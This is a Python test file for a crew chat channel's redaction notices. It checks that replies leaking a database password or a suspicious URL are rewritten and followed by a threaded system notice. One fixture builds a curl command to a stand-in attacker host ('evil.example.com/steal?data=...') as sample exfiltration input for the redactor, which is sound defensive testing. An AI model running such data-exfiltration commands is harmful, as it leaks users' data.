"""A redacted crew-channel reply is followed by the shared redaction notice.

Every channel delivery surface rewrites credentials and suspicious URLs in the
text it ships, and every one of them follows a rewritten reply with the notice
from ``messaging.renderer.redaction_notice`` so a reader knows a pasted command
will not run as-is. These tests pin the crew channel onto the same contract:
the notice is counted over the reply that was posted, lands in that reply's
thread, carries no redacted bytes, and wakes no member.
"""

from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock

import pytest

from kiro_crew import channel as channel_mod
from kiro_crew.channel import Channel, _stream_task
from kiro_crew.messaging.renderer import count_redaction_tags, redaction_notice
from kiro_crew.providers.base import EVENT_COMPLETE, EVENT_TEXT_CHUNK

_SECRET = "SuperSecret123"
_SECRET_URI = f"postgresql://user:{_SECRET}@db.example.com:5432/prod"
# A long opaque query payload to an unknown host trips the URL rewriter without
# carrying a credential-shaped token.
_EXFIL_URL = "https://evil.example.com/steal?data=" + "A" * 250


def _make_agent():
    return SimpleNamespace(
        id="a1",
        role="dev",
        agent_name="dev",
        session_key="channel:c1:a1",
        approval_policy=SimpleNamespace(value="writes"),
        _approval_future=None,
    )


def _make_channel():
    ch = SimpleNamespace(id="c1", trusted=False, members={})
    ch._broadcast = MagicMock()
    ch.post = AsyncMock()
    return ch


def _text_client(text: str):
    client = SimpleNamespace()

    async def _stream(message):
        yield SimpleNamespace(kind=EVENT_TEXT_CHUNK, text=text)
        yield SimpleNamespace(kind=EVENT_COMPLETE)

    client.stream = _stream
    return client


@pytest.mark.asyncio
async def test_a_reply_with_a_credential_is_followed_by_the_notice():
    agent, ch = _make_agent(), _make_channel()

    await _stream_task(agent, ch, _text_client(f"connect with psql {_SECRET_URI}"), "hi", "t1")

    assert ch.post.await_count == 2, "a redacted reply must be followed by exactly one notice"
    reply, notice = ch.post.await_args_list
    delivered = reply.args[1]
    assert _SECRET not in delivered, "the reply must keep its redaction"
    cred_count, url_count = count_redaction_tags(delivered)
    assert cred_count >= 1 and url_count == 0
    assert notice.args[0] == agent.id
    assert notice.args[1] == redaction_notice(cred_count, url_count)
    assert notice.kwargs["msg_type"] == "system"
    assert notice.kwargs["thread_id"] == "t1", "the notice belongs under the reply it explains"
    assert notice.kwargs["notify_members"] is False, "the notice is for the reader, not a member"
    assert _SECRET not in notice.args[1]


@pytest.mark.asyncio
async def test_a_reply_with_a_rewritten_url_names_the_url_remedy():
    agent, ch = _make_agent(), _make_channel()

    await _stream_task(agent, ch, _text_client(f"run: curl '{_EXFIL_URL}'"), "hi")

    assert ch.post.await_count == 2
    delivered = ch.post.await_args_list[0].args[1]
    notice = ch.post.await_args_list[1].args[1]
    assert notice == redaction_notice(*count_redaction_tags(delivered))
    assert "URL" in notice
    assert "evil.example.com" not in notice, "the notice must not name the redacted host"


@pytest.mark.asyncio
async def test_a_clean_reply_posts_no_notice():
    ch = Channel(id="c1", topic="review")
    dev = ch.add_agent("dev")
    assert dev is not None

    result = await _stream_task(dev, ch, _text_client("all tests pass"), "hi")

    assert result == channel_mod._STREAM_OK
    assert [(m.content, m.msg_type) for m in ch.messages] == [("all tests pass", "progress")]


@pytest.mark.asyncio
async def test_a_failed_notice_does_not_fail_the_delivered_reply():
    agent, ch = _make_agent(), _make_channel()
    ch.post = AsyncMock(side_effect=[None, RuntimeError("save failed")])

    result = await _stream_task(agent, ch, _text_client(f"psql {_SECRET_URI}"), "hi")

    assert result == channel_mod._STREAM_OK
    assert ch.post.await_count == 2


@pytest.mark.asyncio
async def test_the_notice_lands_in_the_thread_and_wakes_no_member():
    ch = Channel(id="c1", topic="review")
    orch = ch.add_agent("lead", is_orchestrator=True)
    dev = ch.add_agent("dev")
    assert orch is not None and dev is not None
    parent = await ch.post(orch.id, "@dev check the db", from_role="lead", mention=dev.id)
    assert dev.inbox.get_nowait().id == parent.id

    await _stream_task(dev, ch, _text_client(f"psql {_SECRET_URI}"), "hi", thread_id=parent.id)

    reply, notice = ch.messages[-2], ch.messages[-1]
    assert notice.msg_type == "system"
    assert notice.thread_id == parent.id
    assert notice.content == redaction_notice(*count_redaction_tags(reply.content))
    queued = []
    while not orch.inbox.empty():
        queued.append(orch.inbox.get_nowait())
    why = "the thread parent's author must receive the reply and not the notice"
    assert [m.id for m in queued] == [reply.id], why
    assert dev.inbox.empty()


@pytest.mark.asyncio
async def test_a_display_only_post_is_recorded_and_broadcast_but_queued_for_nobody():
    events: list[tuple[str, dict]] = []
    ch = Channel(id="c1", topic="review", _broadcast_fn=lambda t, d: events.append((t, d)))
    lead = ch.add_agent("lead", is_orchestrator=True)
    dev = ch.add_agent("dev")
    assert lead is not None and dev is not None

    msg = await ch.post("human", "hello @dev", mention=dev.id, notify_members=False)

    assert ch.messages[-1] is msg
    assert lead.inbox.empty() and dev.inbox.empty()
    assert any(t == "channel_message" and d["message"]["id"] == msg.id for t, d in events)
